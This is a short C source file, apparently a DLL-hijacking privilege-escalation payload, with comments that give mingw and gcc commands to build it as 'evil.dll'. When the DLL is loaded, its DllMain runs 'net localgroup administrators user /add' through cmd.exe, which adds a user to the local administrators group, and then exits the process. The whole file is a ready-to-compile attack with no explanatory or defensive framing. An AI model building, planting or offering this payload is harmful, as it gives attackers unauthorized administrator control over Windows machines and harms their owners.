//from linux
//64bit : x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
//32bit : i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

//from windows
//gcc.exe .\evil.c -shared -o evil.dll

#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}